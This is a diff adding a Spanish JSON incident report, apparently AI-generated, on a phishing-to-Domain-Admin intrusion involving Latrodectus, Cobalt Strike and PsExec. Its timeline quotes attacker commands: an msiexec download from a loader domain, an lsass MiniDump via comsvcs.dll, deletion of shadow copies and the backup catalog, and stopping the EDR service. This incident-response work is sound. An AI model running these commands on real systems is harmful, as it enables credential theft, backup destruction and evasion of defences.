@@ -1,0 +1,294 @@
+{
+  "incident_id": "INC-0004",
+  "alert_ids": [
+    "ALR-20261009-011790",
+    "ALR-20261009-011791",
+    "ALR-20261009-011792",
+    "ALR-20261009-011793",
+    "ALR-20261010-011794",
+    "ALR-20261010-011795",
+    "ALR-20261010-011796",
+    "ALR-20261010-011797",
+    "ALR-20261010-011798",
+    "ALR-20261018-011895",
+    "ALR-20261018-011896"
+  ],
+  "related_incidents": [],
+  "title": "INC-0004: phishing con JS (Latrodectus) → Cobalt Strike → PsExec a FS01 con adm.aortega → Domain Admins persistente vía PRINT01 (precursor de ransomware)",
+  "patient_zero": "WS-BCN-1770 (10.10.3.95), portátil de Marta Puig (marta.puig@tarvia.example, Compras). Comprometido el 2026-10-09 ~09:27 UTC tras abrir Pedido_Q4_2026.js del correo EML-0062206.",
+  "initial_access": "Spearphishing con adjunto (T1566.001). El 2026-10-09 09:04 UTC llega a Marta Puig un ZIP con un .js desde pedidos@pedidos-hilaturas-alcoi.example. El dominio imita al proveedor real hilaturas-alcoi.example. SPF softfail, DKIM none, DMARC fail. La IP emisora 81.28.167.30 (RU, proxy residencial) figura como malspam en el TIP. La pasarela lo marcó \"suspicious\" pero lo entregó. Marta ejecutó el .js con wscript a las 09:27 UTC.",
+  "scope": {
+    "users": [
+      "marta.puig@tarvia.example (comprometida: phishing, malware en su sesión, volcado de LSASS)",
+      "adm.aortega@tarvia.example (cuenta privilegiada comprometida: usada desde WS-BCN-1770 y PRINT01; contraseña/hash robado)",
+      "svc_print_upd@tarvia.example (cuenta del atacante, Domain Admins, sin MFA, creada 2026-10-18)"
+    ],
+    "hosts": [
+      "WS-BCN-1770 (10.10.3.95): paciente cero, implante Latrodectus, Cobalt Strike y volcado de LSASS",
+      "FS01 (10.20.2.20): PsExec, svchelper.exe, borrado de shadow copies (bloqueado)",
+      "PRINT01 (10.20.6.63): mismo malware, C2 Cobalt Strike, creación de DA, EDR detenido; sin visibilidad EDR desde 2026-10-18 01:18",
+      "Dominio AD (DC01): Domain Admins comprometido; hay que asumir la pérdida de krbtgt y de los hashes del dominio"
+    ],
+    "data": "No hay evidencia de exfiltración ni de cifrado. FS01 aloja las unidades de Finanzas, Compras y Personas, con probables datos personales y financieros. El borrado de shadow copies y del catálogo de backup apunta a un ransomware inminente. Los 8 días entre el 10 y el 18 de octubre indican acceso persistente al dominio. Las tres cuentas llevan privilegios altos o de dominio.",
+    "business_impact": "Riesgo crítico para Black Friday. Si se cifra FS01 o se pierden los backups, se paran Compras, Finanzas y Personas. El dominio completo está en manos del atacante (Domain Admins). No hay evidencia de impacto en OT ni en TPV."
+  },
+  "root_cause": "Un correo de phishing con lookalike del proveedor Hilaturas Alcoi pasó la pasarela (se entregó pese a SPF softfail y DMARC fail) y el usuario ejecutó el .js. Faltaba bloqueo de .js dentro de ZIP y el EDR solo detectaba. El atacante robó con LSASS las credenciales de adm.aortega, que estaban en caché en un portátil de usuario y se usaron fuera de JUMP01. Eso le permitió moverse lateralmente por PsExec y, después, ser Domain Admin. Un EDR en modo detected_only y la falta de contención durante 8+ días lo dejaron avanzar.",
+  "eradication_and_recovery": [
+    "Reinstalar WS-BCN-1770 desde imagen limpia. Eliminar la Run key Update, C:\\Users\\marta.puig\\AppData\\Roaming\\Custom_update\\ y C:\\ProgramData\\{l.dmp,adf.exe,svchelper.exe}.",
+    "Reconstruir PRINT01 (Windows Server 2016) desde imagen limpia: lleva 8 días comprometido y sin EDR. Retirar C:\\Windows\\Temp\\spoolhlp.exe y el servicio PSEXESVC.",
+    "En FS01, retirar svchelper.exe y PSEXESVC, comprobar integridad de datos y restaurar solo desde backups offline verificados (el catálogo de wbadmin y las shadow copies podrían estar tocados).",
+    "Eliminar svc_print_upd y revisar todos los miembros de Domain Admins, Enterprise Admins y Backup Operators, además de cuentas creadas en los últimos 30 días.",
+    "Hacer un doble restablecimiento de krbtgt y rotar las credenciales de todas las cuentas adm.* y de servicio cuyos hashes pudieran estar en lsass de WS-BCN-1770, PRINT01 o FS01. Rotar svc_backup.",
+    "Caza (hunt) en toda la red de los IOC: aplihartom.com, 203.0.113.88, 107.174.115.43 y los tres hashes. Hunt de PsExec/PSEXESVC fuera de JUMP01 y de otras Run keys con rundll32.",
+    "Pasar el EDR a modo prevención/bloqueo en servidores y puestos, y reactivar el agente en PRINT01 solo tras reconstruirlo.",
+    "Poner los equipos de usuario fuera del alcance de cuentas adm.* (Protected Users, denegar inicio de sesión local y de red en estaciones de trabajo para adm.*).",
+    "Verificar que no queda otro acceso: cuentas locales, tareas programadas, servicios nuevos, GPO modificadas, nuevos certificados."
+  ],
+  "notifications": [
+    "Responsable de seguridad / CISO y dirección: inmediato (Domain Admins comprometido, riesgo de ransomware en plena preparación de Black Friday).",
+    "IT / administradores de AD y propietaria de adm.aortega (Alba Ortega, manager Neus Puig): inmediato, para contención y rotación.",
+    "Marta Puig y su manager (Andrea Lozano): hoy, para informar y cerrar el equipo.",
+    "DPO: hoy. Si se confirma acceso o exfiltración de datos personales en FS01 (Personas, Finanzas), notificar a la AEPD en un máximo de 72 h desde que se tenga constancia.",
+    "Aseguradora de ciberriesgo y, si se activa, la retención de respuesta a incidentes externa: según póliza, normalmente en 24-48 h.",
+    "Adquirente PCI: solo si se acredita que hay datos de tarjetas en FS01 o en los sistemas tocados. Hoy no hay evidencia.",
+    "Hilaturas Alcoi (proveedor legítimo): informar del dominio lookalike pedidos-hilaturas-alcoi.example; no es el origen del ataque.",
+    "Autoridades (CCN-CERT/INCIBE-CERT, policía): valorar con dirección y asesoría jurídica."
+  ],
+  "detection_gaps": [
+    "La pasarela de correo entregó un adjunto 'suspicious' con SPF softfail, DKIM none y DMARC fail de un dominio lookalike. Crear regla: poner en cuarentena los correos DMARC fail con ZIP/JS/ISO, y detectar dominios parecidos a proveedores.",
+    "El EDR estaba en detected_only (EDR-0123402, LSASS y PsExec). Pasar a prevención y bloquear wscript→msiexec con URL y rundll32 con comsvcs MiniDump.",
+    "Beaconing a un dominio de 6 días de edad con User-Agent IE11 en un equipo sin IE (media severidad) tardó ~2 h en alertar. Subir la prioridad si el TIP marca el dominio como malicious y alertar a la primera consulta DNS.",
+    "El NGFW permitió la salida a una IP Cobalt Strike conocida (alerta UC-NET-002) y la de PRINT01 (FW-0026543) ni siquiera generó alerta. Bloqueo automático de IPs C2 del feed y alerta para servidores con destino externo no previsto.",
+    "Login de adm.aortega desde WS-BCN-1770 (SIGN-0083867) sin alerta: crear regla UC-IDP para adm.* fuera de JUMP01.",
+    "Las alertas del 10/10 no se contuvieron; durante 8 días no hubo ninguna actuación y PRINT01 tampoco generó alertas hasta el 18/10. Falta triaje de incidentes críticos y una alerta de 'host con hash malicioso conocido' sobre el hash 70aa… tras la primera detección.",
+    "Detectar creación de cuentas y alta en Domain Admins desde servidores no administrativos (PRINT01), con alerta crítica inmediata. Detectar cuentas de servicio nuevas sin propietario ni MFA.",
+    "Detectar la parada del agente EDR es tarde: crear alerta de latido perdido en 5 min y proteger el servicio contra parada (tamper protection).",
+    "Hora local de la alerta UC-EDR-008 y UC-IDP-008 inconsistente con UTC (p. ej. 00:13 UTC = 02:13 local en CEST, la alerta dice 04:13). Revisar la conversión de zona horaria en el SIEM."
+  ],
+  "confidence": 0.88,
+  "open_questions": [
+    "¿Recibió alguien más el phishing o ejecutó el .js? Solo se ve a Marta en estos datos; revisar todos los destinatarios del mensaje.",
+    "¿Qué hizo exactamente svchelper.exe en FS01 además de borrar shadows? El EDR 'bloqueó' la alerta, pero no se sabe si vssadmin y wbadmin se detuvieron del todo. ¿Hay cifrado o exfiltración desde FS01?",
+    "¿Cómo accedió el atacante a PRINT01 y qué hizo entre el 10 y el 18 de octubre? Hay un hueco de 8 días sin telemetría de PRINT01 salvo la conexión al C2 del 10/10.",
+    "¿Cómo usó adm.aortega el atacante desde PRINT01 el 18/10 (Kerberos/hash, pass-the-hash o sesión interactiva)? Alba Ortega tiene FIDO2; confirmar con ella que no hizo esas acciones.",
+    "EDR-0123431 (13/10): PsExec de adm.dnavarro desde JUMP01 en PRINT01 para 'agente de monitorización 3.4'. Parece legítimo por origen y cuenta, pero no hay cambio aprobado en los datos. Confirmar con IT, y comprobar que PRINT01 no estaba ya comprometida.",
+    "ADE-0000123 (11/10): svc_sccm modificó la cuenta marta.puig desde HR-APP01. ¿Qué cambió? Podría ser el atacante o un proceso legítimo.",
+    "VPN de marta.puig el 13/10 con 166 MB: ¿la usó ella o el atacante con su cuenta? Hay que comprobar el origen y el dispositivo.",
+    "SIGN-0014615 (login de marta.puig en Exchange desde un iPhone, FR/'Dublín', risk low) el 08/10, antes del phishing: probablemente ruido, pero conviene verificarlo.",
+    "¿Se ve actividad relacionada del atacante en otros hosts permitidos por el escaneo (10.20.2.47:1433 y 10.20.2.34:3389)?",
+    "Los hashes del ZIP, del JS y de svchelper no tienen veredicto en el TIP (desconocido no es limpio). Pasarlos a sandbox/VT. El pentest CHG-2026-1042 y CHG-2026-1063 no cubren esta actividad (otro origen, otro alcance)."
+  ],
+  "injection_detected": false,
+  "timeline": [
+    {
+      "timestamp": "2026-10-09T09:04:00.000Z",
+      "event_id": "EML-0062206",
+      "description": "Correo de dominio parecido al del proveedor (lookalike) entrega ZIP con .js a marta.puig. SPF softfail, DMARC fail. Entregado pese a veredicto suspicious.",
+      "mitre": "T1566.001"
+    },
+    {
+      "timestamp": "2026-10-09T09:27:00.000Z",
+      "event_id": "EDR-0123400",
+      "description": "explorer.exe lanza wscript.exe con Pedido_Q4_2026.js desde Descargas: el usuario ejecuta el adjunto.",
+      "mitre": "T1204.002"
+    },
+    {
+      "timestamp": "2026-10-09T09:27:06.000Z",
+      "event_id": "EDR-0123401",
+      "description": "wscript lanza msiexec /q /i https://aplihartom.com/dl/upd.msi. El dominio es C2/loader Latrodectus según el TIP.",
+      "mitre": "T1218.007"
+    },
+    {
+      "timestamp": "2026-10-09T09:27:40.000Z",
+      "event_id": "EDR-0123404",
+      "description": "rundll32 carga upd_x64.dll (sin firma, Latrodectus) y crea la Run key HKCU\\...\\Run\\Update para persistir.",
+      "mitre": "T1547.001"
+    },
+    {
+      "timestamp": "2026-10-09T09:28:00.000Z",
+      "event_id": "PRX-0211359",
+      "description": "Beaconing cada ~60 s por POST a aplihartom.com/live/ (203.0.113.88) con User-Agent IE11 anómalo. Una sola máquina lo ve.",
+      "mitre": "T1071.001"
+    },
+    {
+      "timestamp": "2026-10-09T13:06:11.000Z",
+      "event_id": "ALR-20261009-011793",
+      "description": "WS-BCN-1770 conecta por 443 a 107.174.115.43 (Cobalt Strike en el TIP), permitido por el NGFW (FW-0025180, 13:02). Se pasa del loader a un C2 de postexplotación.",
+      "mitre": "T1071"
+    },
+    {
+      "timestamp": "2026-10-10T00:13:00.000Z",
+      "event_id": "EDR-0123405",
+      "description": "Ráfaga de reconocimiento de dominio desde rundll32 (whoami, net group Domain Admins, nltest, AdFind) en 54 s, fuera de horario.",
+      "mitre": "T1087.002"
+    },
+    {
+      "timestamp": "2026-10-10T00:22:00.000Z",
+      "event_id": "EDR-0123412",
+      "description": "rundll32 comsvcs.dll MiniDump del PID 708 (lsass) a C:\\ProgramData\\l.dmp. En el equipo había credenciales en caché de adm.aortega. El EDR solo detectó.",
+      "mitre": "T1003.001"
+    },
+    {
+      "timestamp": "2026-10-10T00:28:00.000Z",
+      "event_id": "FW-0025181",
+      "description": "Escaneo interno desde WS-BCN-1770: 96 destinos y puertos 445/3389/135/5985/22/1433 hacia DC-SERVERS. Algunos permitidos (1433 a 10.20.2.47, 3389 a 10.20.2.34).",
+      "mitre": "T1046"
+    },
+    {
+      "timestamp": "2026-10-10T00:40:00.000Z",
+      "event_id": "SIGN-0083867",
+      "description": "Login Kerberos de adm.aortega desde WS-BCN-1770, no desde JUMP01. Contraviene la política y encaja con credenciales robadas de LSASS.",
+      "mitre": "T1078.002"
+    },
+    {
+      "timestamp": "2026-10-10T00:40:04.000Z",
+      "event_id": "EDR-0123413",
+      "description": "PsExec (PSEXESVC) desde WS-BCN-1770 instala servicio en FS01. A las 00:40:09 arranca svchelper.exe sin firma (EDR-0123414).",
+      "mitre": "T1021.002"
+    },
+    {
+      "timestamp": "2026-10-10T00:51:06.000Z",
+      "event_id": "EDR-0123435",
+      "description": "El mismo binario (hash 70aa203e…) corre en PRINT01 como spoolhlp.exe, vía PsExec con adm.aortega. A las 00:56 PRINT01 conecta al C2 Cobalt Strike (FW-0026543).",
+      "mitre": "T1570"
+    },
+    {
+      "timestamp": "2026-10-10T01:05:00.000Z",
+      "event_id": "EDR-0123415",
+      "description": "En FS01, svchelper.exe ejecuta vssadmin delete shadows y a las 01:05:05 wbadmin delete catalog (EDR-0123416). El EDR bloqueó la acción. Patrón previo al cifrado.",
+      "mitre": "T1490"
+    },
+    {
+      "timestamp": "2026-10-18T01:13:00.000Z",
+      "event_id": "ADE-0000571",
+      "description": "Ocho días después, adm.aortega desde PRINT01 crea svc_print_upd (ADE-0000570, 01:12) y la añade a Domain Admins. Sin cambio aprobado. Cuenta sin MFA y con contraseña que no caduca.",
+      "mitre": "T1098"
+    },
+    {
+      "timestamp": "2026-10-18T01:18:00.000Z",
+      "event_id": "EDR-0123436",
+      "description": "spoolhlp.exe ejecuta sc stop EDRAgentSvc en PRINT01 y el agente queda detenido (EDR-0123437). Fuera de ventana de mantenimiento.",
+      "mitre": "T1562.001"
+    }
+  ],
+  "containment_plan": [
+    {
+      "action": "isolate_host",
+      "target": "WS-BCN-1770",
+      "business_impact": "Marta Puig (Compras) se queda sin portátil hasta reinstalarlo. Pierde trabajo local no sincronizado.",
+      "approver": "N2",
+      "x_requires_approval": true,
+      "x_note": "Aislar un puesto de trabajo"
+    },
+    {
+      "action": "isolate_host",
+      "target": "PRINT01",
+      "business_impact": "Se corta la impresión de la sede (criticidad baja). Con el EDR detenido, el aislamiento debe hacerse a nivel de red/VLAN.",
+      "approver": "N2 + responsable del servicio",
+      "x_requires_approval": true,
+      "x_note": "Aislar servidor (Servidor de impresión; Impresión)"
+    },
+    {
+      "action": "isolate_host",
+      "target": "FS01",
+      "business_impact": "Dejan de estar disponibles las unidades compartidas de Finanzas, Compras y Personas en plena preparación de Black Friday. Valorar con dirección; el riesgo de cifrado lo justifica.",
+      "approver": "N2 + responsable del servicio",
+      "x_requires_approval": true,
+      "x_note": "Aislar servidor (Servidor de ficheros; Unidades compartidas (Finanzas, Compras, Personas))"
+    },
+    {
+      "action": "disable_user",
+      "target": "svc_print_upd@tarvia.example",
+      "business_impact": "Ninguno conocido: sin propietario, creada por el atacante.",
+      "approver": "N2",
+      "x_requires_approval": true,
+      "x_note": "Cuenta de servicio: puede parar un proceso de negocio"
+    },
+    {
+      "action": "disable_user",
+      "target": "adm.aortega@tarvia.example",
+      "business_impact": "Alba Ortega pierde la administración privilegiada hasta tener una cuenta nueva. Usar un break-glass si es necesario.",
+      "approver": "N2",
+      "x_requires_approval": true,
+      "x_note": "Deshabilitar cuenta de usuario"
+    },
+    {
+      "action": "reset_password",
+      "target": "adm.aortega@tarvia.example",
+      "business_impact": "Cierra la sesión de administración. Coordinar con Alba Ortega y revisar tareas o servicios que usen la cuenta.",
+      "approver": "N2",
+      "x_requires_approval": true,
+      "x_note": "Revocar sesiones / forzar cambio de contraseña"
+    },
+    {
+      "action": "revoke_sessions",
+      "target": "adm.aortega@tarvia.example",
+      "business_impact": "Cierra sesiones activas, incluidas las legítimas desde JUMP01.",
+      "approver": "N2",
+      "x_requires_approval": true,
+      "x_note": "Revocar sesiones / forzar cambio de contraseña"
+    },
+    {
+      "action": "reset_password",
+      "target": "marta.puig@tarvia.example",
+      "business_impact": "Marta tendrá que volver a autenticarse y volver a registrar el MFA push. Pérdida breve de productividad.",
+      "approver": "N2",
+      "x_requires_approval": true,
+      "x_note": "Revocar sesiones / forzar cambio de contraseña"
+    },
+    {
+      "action": "revoke_sessions",
+      "target": "marta.puig@tarvia.example",
+      "business_impact": "Se cierran sus sesiones de correo, Teams y VPN. Debe iniciar sesión de nuevo.",
+      "approver": "N2",
+      "x_requires_approval": true,
+      "x_note": "Revocar sesiones / forzar cambio de contraseña"
+    },
+    {
+      "action": "block_ioc",
+      "target": "aplihartom.com, 203.0.113.88, 107.174.115.43",
+      "business_impact": "Corta el C2 Latrodectus y Cobalt Strike. Riesgo muy bajo de falsos positivos.",
+      "approver": "analista",
+      "x_requires_approval": false,
+      "x_note": "El N1 puede ejecutarla"
+    },
+    {
+      "action": "block_ioc",
+      "target": "SHA256 6f395de6…b466 (JS), 0cfa0bdd…d697 (DLL), 70aa203e…3c44 (svchelper/spoolhlp), 3634e8cc…8768 (ZIP)",
+      "business_impact": "Bloquea la ejecución de los artefactos conocidos. No cubre variantes.",
+      "approver": "analista",
+      "x_requires_approval": false,
+      "x_note": "El N1 puede ejecutarla"
+    },
+    {
+      "action": "block_ioc",
+      "target": "pedidos-hilaturas-alcoi.example, pedidos@pedidos-hilaturas-alcoi.example, 81.28.167.30",
+      "business_impact": "Bloquea el correo del dominio lookalike. No bloquear hilaturas-alcoi.example (proveedor legítimo).",
+      "approver": "analista",
+      "x_requires_approval": false,
+      "x_note": "El N1 puede ejecutarla"
+    },
+    {
+      "action": "purge_email",
+      "target": "Mensaje <20261009110402.4411@pedidos-hilaturas-alcoi.example> en todos los buzones",
+      "business_impact": "Elimina el correo del buzón. Ninguno si solo era phishing; confirmar el alcance primero.",
+      "approver": "analista",
+      "x_requires_approval": false,
+      "x_note": "El N1 puede ejecutarla"
+    },
+    {
+      "action": "escalate",
+      "target": "Jefe de seguridad / respuesta a incidentes: doble restablecimiento de krbtgt, auditoría de Domain Admins y GPO, revisión de DC01",
+      "business_impact": "El restablecimiento de krbtgt puede cortar sesiones Kerberos legítimas durante unas horas. Planificar la ventana y avisar a IT.",
+      "approver": "analista",
+      "x_requires_approval": false,
+      "x_note": "Acción del analista, sin API"
+    }
+  ],
+  "x_dropped_timeline": [],
+  "x_llm_provider": "claude_code",
+  "x_llm_cached": false,
+  "x_no_ai": false,
+  "x_evidence_chars": 55378,
+  "x_seconds": 67.5
+}
